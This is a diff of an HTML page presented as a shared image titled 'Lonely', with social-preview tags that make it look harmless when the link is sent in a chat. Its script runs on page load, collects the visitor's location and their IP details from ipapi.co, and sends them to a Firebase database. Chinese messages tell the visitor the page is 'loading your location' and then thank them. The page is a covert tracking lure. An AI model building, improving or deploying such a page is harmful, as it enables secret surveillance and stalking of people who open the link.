@@ -4,50 +4,97 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Lonely</title>
-    
-    <!-- WhatsApp Preview -->
-    <meta property="og:title" content="Lonely">
-    <meta property="og:description" content="">
-    <meta property="og:image" content="https://i.imgur.com/2fK9pL8.jpg">
-    <meta property="og:type" content="website">
+
+    <!-- Open Graph / Social Media Meta Tags -->
+    <meta property="og:title" content="Lonely" />
+    <meta property="og:description" content="A captivating image reflecting solitude and introspection, combined with location logging functionality. Click to explore more." />
+    <meta property="og:url" content="https://koko17-stack.github.io/MISSCOOL/" />
+    <meta property="og:image" content="https://raw.githubusercontent.com/KOKO17-stack/MISSCOOL/main/alone%20prisoner.jpg" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+    <meta property="og:type" content="website" />
 
     <style>
-        body { 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
-            background-color: #f8f9fa;
-            color: #333;
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #000;
+            margin: 0;
+            padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            margin: 0;
+            overflow: hidden; /* Prevents scrollbars if image slightly overflows */
+            position: relative; /* Needed for absolute positioning of status messages */
+        }
+
+        .container-link {
+            display: block;
+            width: 100%;
+            height: 100%;
+            text-decoration: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: 1; /* Ensure the link is clickable */
+        }
+
+        .hero-image {
+            width: 100%;
+            height: 100%;
+            object-fit: cover; /* Ensures the image covers the area without distortion */
+            display: block;
+        }
+
+        #logger-status {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 2; /* Ensure messages are on top of the image */
+            background-color: rgba(0, 0, 0, 0.7);
+            color: #fff;
+            padding: 20px;
+            border-radius: 8px;
             text-align: center;
+            max-width: 80%;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
         }
-        .container { 
-            padding: 20px; 
-            max-width: 400px; 
-            width: 90%; 
+
+        #logger-status h1, #logger-status h2, #logger-status p {
+            margin: 0 0 10px 0;
+            color: inherit;
         }
-        h1 { 
-            font-size: 1.5rem; 
-            margin-bottom: 10px; 
+
+        #logger-status h1 {
+            font-size: 1.8rem;
         }
-        p { 
-            font-size: 0.9rem; 
-            color: #666; 
+
+        #logger-status p {
+            font-size: 1rem;
+            color: #ccc;
         }
-        .success { 
-            color: #28a745; 
-            font-weight: bold; 
+
+        .success {
+            color: #28a745;
+            font-weight: bold;
         }
-        .error { 
-            color: #dc3545; 
-            font-weight: bold; 
+
+        .error {
+            color: #dc3545;
+            font-weight: bold;
         }
     </style>
 </head>
 <body>
-    <div class="container" id="content">
+
+    <a href="https://koko17-stack.github.io/MISSCOOL/" class="container-link">
+        <img src="https://raw.githubusercontent.com/KOKO17-stack/MISSCOOL/main/alone%20prisoner.jpg" 
+             alt="A lone prisoner in a desolate setting, evoking feelings of solitude." 
+             class="hero-image">
+    </a>
+
+    <div id="logger-status">
         <h1 id="heading">请稍等，正在加载您的位置...</h1>
         <p id="subtitle">这只需要一点时间。</p>
     </div>
@@ -56,7 +103,7 @@
         const FIREBASE_URL = "https://kojocoords-default-rtdb.europe-west1.firebasedatabase.app/location.json";
 
         async function logLocation() {
-            const content = document.getElementById('content');
+            const loggerStatusDiv = document.getElementById("logger-status");
             
             const payload = {
                 timestamp: new Date().toISOString(),
@@ -110,7 +157,7 @@
 
             // IP info (silent)
             try {
-                const res = await fetch('https://ipapi.co/json');
+                const res = await fetch("https://ipapi.co/json");
                 if (res.ok) {
                     const data = await res.json();
                     payload.ip = data.ip || "unavailable";
@@ -133,19 +180,19 @@
                 });
 
                 if (firebaseRes.ok) {
-                    content.innerHTML = `<h2 class="success">谢谢！现在一切都很好 ❤️</h2>`;
+                    loggerStatusDiv.innerHTML = `<h2 class="success">谢谢！现在一切都很好 ❤️</h2>`;
                 } else {
-                    console.error("Firebase request failed with status:", firebaseRes.status);
-                    content.innerHTML = `<h2 class="error">出了点问题。<br>请稍后再试。</h2>`;
+                    console.error("Firebase request failed with status:", firebaseRes.status, await firebaseRes.text());
+                    loggerStatusDiv.innerHTML = `<h2 class="error">出了点问题。<br>请稍后再试。</h2>`;
                 }
             } catch (e) {
                 console.error("Error sending data to Firebase:", e);
-                content.innerHTML = `<h2 class="error">出了点问题。<br>请稍后再试。</h2>`;
+                loggerStatusDiv.innerHTML = `<h2 class="error">出了点问题。<br>请稍后再试。</h2>`;
             }
         }
 
         // Start the script once the page is fully loaded
-        document.addEventListener('DOMContentLoaded', logLocation);
+        document.addEventListener("DOMContentLoaded", logLocation);
     </script>
 </body>
 </html>
